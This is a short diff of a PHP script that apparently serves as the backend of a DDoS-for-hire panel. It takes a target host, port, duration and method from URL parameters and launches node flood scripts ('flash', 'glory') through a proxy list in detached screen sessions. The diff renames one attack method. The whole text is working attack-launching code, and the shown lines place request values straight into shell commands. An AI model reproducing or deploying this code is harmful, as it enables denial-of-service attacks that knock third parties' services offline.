@@ -21,8 +21,8 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     }
 
     switch ($method) {
-        case 'H2PEZ':
-            $command = "cd /var/www/html/test/ && screen -dm node god $host $time 8 2 proxy.txt";
+        case 'H2FLASH':
+            $command = "cd /var/www/html/test/ && screen -dm node flash $host $time 8 2 proxy.txt";
             break;
         case 'GLORY':
             $command = "cd /var/www/html/test/ && screen -dm node glory $host $time 8 2 proxy.txt";
